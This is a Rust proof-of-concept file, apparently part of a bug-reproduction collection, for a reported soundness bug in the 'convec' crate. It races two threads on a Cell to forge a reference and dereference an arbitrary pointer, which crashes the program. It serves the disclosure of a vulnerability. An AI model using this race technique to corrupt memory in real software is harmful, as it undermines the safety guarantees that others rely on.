/*!
```rudra-poc
[target]
crate = "convec"
version = "2.0.1"

[[target.peer]]
crate = "crossbeam-utils"
version = "0.8.0"

[test]
analyzers = ["SendSyncChecker"]

[report]
issue_url = "https://github.com/krl/convec/issues/2"
issue_date = 2020-11-24
```
!*/
#![forbid(unsafe_code)]

use std::cell::Cell;

use convec::*;
use crossbeam_utils::thread;

static SOME_INT: u128 = 0x41414141;

fn main() {
    // A simple tagged union used to demonstrate the problems with data races
    // in Cell. Cell is designed for single threads and has no synchronization
    // methods. Thus if it is allowed to be used simultaneously by two threads,
    // it is possible to race its interior mutability methods to dereference an
    // arbitrary pointer.
    #[derive(Debug, Clone, Copy)]
    enum RefOrInt<'a> {
        Ref(&'a u128),
        Int(u128),
    }

    let mut vec: AoVec<Cell<RefOrInt>> = AoVec::new();
    vec.push(Cell::new(RefOrInt::Ref(&SOME_INT)));

    thread::scope(|s| {
        let vec_ref = &vec;
        let child = s.spawn(move |_| {
            let smuggled = vec_ref.get(0).unwrap();

            println!("Child thread: {:p} - {:?}", smuggled.as_ptr(), smuggled);
            loop {
                // Repeatedly write Ref(&addr) and Int(0xdeadbeef) into the cell.
                smuggled.set(RefOrInt::Ref(&SOME_INT));
                smuggled.set(RefOrInt::Int(0xdeadbeef));
            }
        });

        let main_cell = vec_ref.get(0).unwrap();
        println!("Main thread: {:p} - {:?}", main_cell.as_ptr(), main_cell);
        loop {
            if let RefOrInt::Ref(addr) = main_cell.clone().into_inner() {
                // Hope that between the time we pattern match the object as a
                // `Ref`, it gets written to by the child thread.
                if addr as *const u128 == &SOME_INT as *const u128 {
                    continue;
                }

                // Due to the data race, obtaining Ref(0xdeadbeef) is possible
                println!("Reference points to: {:p}", addr);
                println!("Dereferencing addr will now segfault: {}", *addr);
            }
        }
    });
}
